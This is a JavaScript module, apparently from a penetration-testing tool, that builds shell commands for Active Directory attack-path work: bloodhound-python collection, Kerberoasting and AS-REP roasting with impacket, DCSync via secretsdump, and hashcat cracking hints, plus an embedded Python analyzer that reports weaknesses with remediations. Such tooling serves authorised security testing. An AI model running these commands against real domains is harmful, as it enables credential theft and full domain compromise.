// AD — Active Directory attack-path enumeration (BloodHound / SharpHound territory).
//
// The gap this fills: CypherMind had NetExec (network/AD swiss-army) but no BloodHound-style attack-path
// analysis. This tag collects AD data with **bloodhound-python** (dirkjanm's LINUX collector — no Windows/
// SharpHound.exe needed, runs from Kali) and then runs an OFFLINE Python risk engine over the collected JSON
// to surface the classic escalation paths (Kerberoastable/AS-REP-roastable users, unconstrained delegation,
// privileged group membership, password-policy weaknesses, stale OSes). Plus impacket quick-wins the graph
// reveals: Kerberoasting, AS-REP roasting, DCSync.
//
// AUTHORIZATION: collection/roasting hit a real Domain Controller (gated on the target). Offline `analyze`
// of already-collected JSON is local (ungated), like the iam analyzer.

// Install the Linux collector + impacket if missing.
const ENSURE_BH =
  'command -v bloodhound-python >/dev/null 2>&1 || pipx install bloodhound-python >/dev/null 2>&1 || ' +
  'pip3 install bloodhound >/dev/null 2>&1 || pip install bloodhound >/dev/null 2>&1; ';
const ENSURE_IMPACKET =
  'command -v impacket-GetUserSPNs >/dev/null 2>&1 || command -v GetUserSPNs.py >/dev/null 2>&1 || ' +
  'pipx install impacket >/dev/null 2>&1 || pip3 install impacket >/dev/null 2>&1; ';

// Prefer the impacket-prefixed binaries (Kali), fall back to the .py names.
const IMP = (name) => `$(command -v impacket-${name} || command -v ${name}.py || echo ${name}.py)`;

const NO_AD_MSG =
  'AD-NODATA: No collected BloodHound JSON found (run ```ad collect <domain> u=<user> p=<pass> dc=<dc-ip> ' +
  'first), or the collector could not reach the Domain Controller. AD enumeration needs valid domain ' +
  'credentials and network line-of-sight to a DC (LDAP/389, SMB/445, Kerberos/88). On a cloud backend with ' +
  'no route to the target AD this cannot work — run the exec backend on a host that can reach the DC.';

const q = (s) => `'${String(s).replace(/'/g, `'\\''`)}'`;

// ---- offline attack-path analyzer (Python, base64-embedded — no backslashes, chr() for tab/nl) ----
// Reads bloodhound-python's *_users.json / *_computers.json / *_groups.json in the cwd and prints
// ADFIND<TAB>sev<TAB>type<TAB>title<TAB>evidence<TAB>remediation lines that parseAdReport turns into findings.
const ANALYZER_PY = `
import json, glob, os
TAB = chr(9)
def emit(sev, typ, title, ev, rem):
    print("ADFIND" + TAB + sev + TAB + typ + TAB + title + TAB + str(ev)[:160] + TAB + rem)

def load(patterns):
    out = []
    seen_files = set()
    for pat in patterns:
        for fn in glob.glob(pat):
            if fn in seen_files:
                continue
            seen_files.add(fn)
            try:
                d = json.load(open(fn, "r", encoding="utf-8", errors="ignore"))
            except Exception:
                continue
            for key in ("users", "computers", "groups", "data", "domains"):
                if isinstance(d, dict) and isinstance(d.get(key), list):
                    out.extend(d[key])
    return out

def props(o):
    p = o.get("Properties") or o.get("properties") or {}
    return {str(k).lower(): v for k, v in p.items()}

users = load(["*_users.json", "*users.json"])
comps = load(["*_computers.json", "*computers.json"])
groups = load(["*_groups.json", "*groups.json"])

kerb = 0
asrep = 0
for u in users:
    p = props(u)
    name = p.get("name") or p.get("samaccountname") or "?"
    enabled = p.get("enabled", True)
    if not enabled:
        continue
    spns = p.get("serviceprincipalnames") or p.get("hasspn")
    if spns:
        kerb += 1
        emit("high", "ad-kerberoast", "Kerberoastable user: " + str(name),
             "has SPN(s) — request its TGS and crack offline", "Use a long random gMSA/managed password or a 25+ char passphrase; remove unnecessary SPNs.")
    if p.get("dontreqpreauth"):
        asrep += 1
        emit("high", "ad-asrep", "AS-REP roastable user: " + str(name),
             "Kerberos pre-auth disabled — request AS-REP and crack offline", "Enable Kerberos pre-authentication on the account.")
    if p.get("unconstraineddelegation"):
        emit("critical", "ad-delegation", "Unconstrained delegation on user: " + str(name),
             "can impersonate any user that authenticates to it", "Remove unconstrained delegation; use constrained/RBCD with protocol transition only where required.")
    if p.get("passwordnotreqd"):
        emit("medium", "ad-password", "PASSWD_NOTREQD set on user: " + str(name),
             "account may have a blank/no password", "Clear the PASSWD_NOTREQD flag and enforce a password.")
    if p.get("admincount") in (1, True) and (p.get("pwdneverexpires")):
        emit("low", "ad-password", "Privileged account with non-expiring password: " + str(name),
             "adminCount=1 and password never expires", "Rotate and expire privileged-account passwords; prefer tiered admin + PAWs.")

for c in comps:
    p = props(c)
    name = p.get("name") or "?"
    if p.get("unconstraineddelegation"):
        emit("critical", "ad-delegation", "Unconstrained delegation on computer: " + str(name),
             "a DA logon here can be captured (TGT) — classic DC compromise path", "Remove unconstrained delegation from non-DC hosts; mark sensitive accounts as 'not delegated'.")
    os_ = str(p.get("operatingsystem") or "")
    if any(x in os_ for x in ("2003", "2008", "Windows XP", "Windows 7", "Windows Server 2012")):
        emit("medium", "ad-stale-os", "Unsupported/legacy OS: " + str(name) + " (" + os_ + ")",
             os_, "Decommission or isolate end-of-life systems; they lack modern patches and hardening.")

for g in groups:
    p = props(g)
    name = str(p.get("name") or "")
    if any(h in name.upper() for h in ("DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS")):
        members = g.get("Members") or g.get("members") or []
        if isinstance(members, list) and len(members) > 0:
            emit("info", "ad-privileged-group", "Privileged group: " + name + " (" + str(len(members)) + " members)",
                 str(len(members)) + " direct members", "Minimize Domain/Enterprise Admins membership; use just-in-time admin and tiered administration.")

total = len(users) + len(comps) + len(groups)
if total == 0:
    print("AD-NODATA: no BloodHound JSON in the current directory")
else:
    print("[*] analyzed " + str(len(users)) + " users, " + str(len(comps)) + " computers, " + str(len(groups)) + " groups; kerberoastable=" + str(kerb) + " asrep=" + str(asrep))
`;

function analyzerCommand() {
  const b64 = Buffer.from(ANALYZER_PY, 'utf8').toString('base64');
  return `echo ${b64} | base64 -d > /tmp/cm_ad.py && python3 /tmp/cm_ad.py`;
}

// Build a shell command for an AD action.
//   action : check|collect|analyze|kerberoast|asreproast|dcsync
//   opts   : domain, user, pass, dc (DC host/ip), dcip (DC ip), file
export function buildAdCommand({ action, domain, user, pass, dc, dcip, file } = {}) {
  const DCIP = dcip || dc || '';
  const creds = (domain && user) ? `${domain}/${user}${pass ? ':' + pass : ''}` : '';
  const needDomain = (fn) => (domain ? fn() : `echo ${q('AD-USAGE: this action needs a domain, e.g. ```ad collect corp.local u=jdoe p=Passw0rd dc=10.0.0.10'.replace('```', ''))}`);

  switch (action) {
    case 'check':
      return 'echo "[*] bloodhound-python: $(command -v bloodhound-python || echo MISSING)"; ' +
        'echo "[*] impacket GetUserSPNs: $(command -v impacket-GetUserSPNs || command -v GetUserSPNs.py || echo MISSING)"; ' +
        'echo "[*] neo4j: $(command -v neo4j || echo optional-not-required)"; ls -1 *_users.json 2>/dev/null && echo "[*] collected AD JSON present" || echo "[*] no collected AD JSON yet"';
    case 'collect':
      // bloodhound-python LDAP collector → *_users/_computers/_groups.json in cwd.
      return needDomain(() => (user && pass && DCIP)
        ? ENSURE_BH + `echo "[*] collecting AD data from ${domain} via ${DCIP}"; ` +
          `bloodhound-python -u ${q(user)} -p ${q(pass)} -d ${q(domain)} -dc ${q(dc || domain)} -ns ${q(DCIP)} -c All --zip 2>&1 | tail -20; ` +
          `echo "[*] files:"; ls -1 *_users.json *_computers.json *_groups.json 2>/dev/null`
        : `echo ${q('AD-USAGE: collect needs u=<user> p=<pass> dc=<dc-ip>, e.g. ```ad collect corp.local u=jdoe p=Passw0rd dc=10.0.0.10'.replace('```', ''))}`);
    case 'analyze':
      // Offline analysis of already-collected JSON (optionally unzip a provided file first).
      return (file ? `unzip -o ${q(file)} >/dev/null 2>&1; ` : '') + analyzerCommand();
    case 'kerberoast':
      return needDomain(() => (user && pass && DCIP)
        ? ENSURE_IMPACKET + `${IMP('GetUserSPNs')} ${q(creds)} -dc-ip ${q(DCIP)} -request -outputfile cm_kerb.hashes 2>&1 | tail -40; ` +
          `echo "[*] hashes -> cm_kerb.hashes (crack with: hashcat -m 13100 cm_kerb.hashes rockyou.txt)"`
        : `echo ${q('AD-USAGE: kerberoast needs u=<user> p=<pass> dc=<dc-ip>')}`);
    case 'asreproast':
      return needDomain(() => DCIP
        ? ENSURE_IMPACKET + (user && pass
          ? `${IMP('GetNPUsers')} ${q(creds)} -dc-ip ${q(DCIP)} -request -format hashcat -outputfile cm_asrep.hashes 2>&1 | tail -40`
          : `echo "[*] no creds — provide a userlist as file=users.txt for unauthenticated AS-REP roast"; ${file ? `${IMP('GetNPUsers')} ${q(domain + '/')} -usersfile ${q(file)} -dc-ip ${q(DCIP)} -format hashcat -no-pass -outputfile cm_asrep.hashes 2>&1 | tail -40` : 'true'}`) +
          `; echo "[*] hashes -> cm_asrep.hashes (crack with: hashcat -m 18200 cm_asrep.hashes rockyou.txt)"`
        : `echo ${q('AD-USAGE: asreproast needs dc=<dc-ip> (+ creds or file=<userlist>)')}`);
    case 'dcsync':
      return needDomain(() => (user && pass && DCIP)
        ? ENSURE_IMPACKET + `${IMP('secretsdump')} ${q(creds)}@${q(DCIP)} -just-dc 2>&1 | tail -60`
        : `echo ${q('AD-USAGE: dcsync needs u=<user> p=<pass> dc=<dc-ip> (user must hold replication rights)')}`);
    default:
      return `echo ${q(`AD-USAGE: unknown action "${action}". Try: check | collect <domain> u= p= dc= | analyze [file=zip] | kerberoast <domain> u= p= dc= | asreproast <domain> dc= [u= p=] | dcsync <domain> u= p= dc=`)}`;
  }
}

// Honest "no AD data / can't reach DC" detection.
export function isNoAd(output) {
  const t = String(output || '');
  return /AD-NODATA|no BloodHound JSON|could not connect|connection refused|errno|invalid credentials|KDC_ERR|Errno|no route to host|name or service not known/i.test(t) &&
    !/ADFIND\t/.test(t);
}

// Turn ADFIND sentinel lines (from the analyzer) + impacket roast output into findings.
export function extractAdFindings(command, output) {
  if (!output || !/\bad\b|bloodhound|GetUserSPNs|GetNPUsers|secretsdump|ADFIND/i.test(command + output)) return [];
  const out = [];
  const source = 'ad';
  const seen = new Set();

  for (const line of String(output).split(/\r?\n/)) {
    const m = /^ADFIND\t(critical|high|medium|low|info)\t([^\t]+)\t([^\t]+)\t([^\t]*)\t([^\t]*)$/.exec(line);
    if (!m) continue;
    const key = m[3];
    if (seen.has(key)) continue; seen.add(key);
    out.push({
      finding_type: m[2], severity: m[1], title: m[3],
      evidence: m[4] || undefined, remediation: m[5] || undefined, source,
    });
  }

  // Kerberoast/AS-REP hashes captured by impacket → concrete critical findings.
  if (/\$krb5tgs\$/.test(output)) {
    out.push({ finding_type: 'ad-kerberoast', severity: 'high', title: 'Kerberoast TGS hash captured (crackable offline)',
      evidence: 'krb5tgs hash retrieved via GetUserSPNs', source, cwe: 'CWE-522',
      remediation: 'Crack with hashcat -m 13100; then rotate the service account to a 25+ char / gMSA password.' });
  }
  if (/\$krb5asrep\$/.test(output)) {
    out.push({ finding_type: 'ad-asrep', severity: 'high', title: 'AS-REP hash captured (crackable offline)',
      evidence: 'krb5asrep hash retrieved via GetNPUsers', source, cwe: 'CWE-522',
      remediation: 'Crack with hashcat -m 18200; enable Kerberos pre-authentication on the account.' });
  }
  return out;
}

export function adLabel(body) {
  return 'ad: ' + String(body || '').split('\n')[0].slice(0, 80);
}
